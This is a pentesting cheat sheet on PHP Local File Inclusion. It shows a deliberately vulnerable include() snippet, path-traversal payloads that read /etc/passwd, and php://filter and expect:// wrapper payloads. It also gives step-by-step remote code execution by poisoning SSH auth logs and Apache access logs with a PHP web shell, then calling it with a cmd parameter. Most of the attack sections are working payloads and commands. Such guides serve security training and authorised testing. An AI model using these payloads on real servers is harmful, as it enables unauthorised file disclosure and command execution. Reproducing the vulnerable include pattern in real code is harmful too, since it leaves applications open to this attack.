## LFI Local File Inclusion
- An attacker can use Local File Inclusion (LFI) to trick the web application into exposing or running files on the web server.
- LFI occurs when an application uses the path to a file as input. If the application treats this input as trusted, a local file may be used in the include statement.
- Example:
````
/**
* Get the filename from a GET input
* Example - http://example.com/?file=filename.php
*/
$file = $_GET['file'];

/**
* Unsafely include the file
* Example - filename.php
*/
include('directory/' . $file);
````
- In the above example, an attacker could make the following request. It tricks the application into executing a PHP script such as a web shell that the attacker managed to upload to the web server.
````
http://example.com/?file=../../uploads/evil.php
````
- Even without the ability to upload and execute code, a Local File Inclusion vulnerability can be dangerous. 
- An attacker can still perform a Directory Traversal / Path Traversal attack using an LFI vulnerability as follows.
````
http://example.com/?file=../../../../etc/passwd
````
- Testing 
- If you see a webpage URL look like this:
````
/script.php?page=index.html 
````
Test for:
````
/script.php?page=../../../../../../../../etc/passwd
````
### PHP Wrappers
- PHP has a number of wrappers that can often be abused to bypass various input filters.
#### PHP Expect Wrapper
- `PHP expect://` allows execution of system commands, unfortunately the expect PHP module is not enabled by default
````
php?page=expect://ls
````
#### PHP php://filter
`php://filter` allows a pen tester to include local files and base64 encodes the output. Therefore, any base64 output will need to be decoded to reveal the contents.
````
vuln.php?page=php://filter/convert.base64-encode/resource=/etc/passwd  
````
- `php://filter` can also be used without base64 encoding the output using:
````
?page=php://filter/resource=/etc/passwd
````
### RCE via SSH
- Try to ssh into the box with a PHP code as username <?php system($_GET["cmd"]);?>.
````
ssh <?php system($_GET["cmd"]);?>@10.10.10.10
````
- Then include the SSH log files inside the Web Application.
````
http://example.com/index.php?page=/var/log/auth.log&cmd=id
````
### RCE via Apache logs
- Poison the User-Agent in access logs:
````
curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
````
- Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.
- Then request the logs via the LFI and execute your command.
````
curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
````
### Resources
- https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/




















